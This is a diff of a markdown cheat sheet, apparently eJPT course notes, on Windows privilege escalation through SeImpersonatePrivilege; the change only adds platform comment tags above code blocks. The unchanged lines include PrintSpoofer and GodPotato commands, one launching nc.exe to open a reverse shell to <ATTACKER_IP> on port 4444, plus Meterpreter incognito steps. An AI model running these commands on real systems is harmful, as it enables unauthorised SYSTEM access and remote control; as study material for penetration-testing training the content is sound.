@@ -7,6 +7,7 @@ Used on: **eJPT / Course Reference**
 ## 1. Enumeration
 
 Check the current user's privileges:
+<!-- cmd: windows -->
 ```cmd
 whoami /priv
 ```
@@ -22,12 +23,14 @@ If `SeImpersonatePrivilege` is enabled, several tools can force a `SYSTEM` proce
 
 ### PrintSpoofer
 Abuses the Print Spooler service. Excellent for modern Windows versions.
+<!-- cmd: windows -->
 ```cmd
 PrintSpoofer64.exe -i -c cmd.exe
 ```
 
 ### GodPotato / JuicyPotato
 Abuses DCOM activations. JuicyPotato is primarily for older OS versions; GodPotato targets newer Windows versions.
+<!-- cmd: windows -->
 ```cmd
 GodPotato-NET4.exe -cmd "cmd.exe /c C:\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
 ```
@@ -39,6 +42,7 @@ Useful when `SeImpersonatePrivilege` is present but standard DCOM/RPC methods ar
 
 If you have a Meterpreter session running with `SeImpersonatePrivilege`:
 
+<!-- cmd: linux -->
 ```bash
 # Load the incognito extension
 load incognito
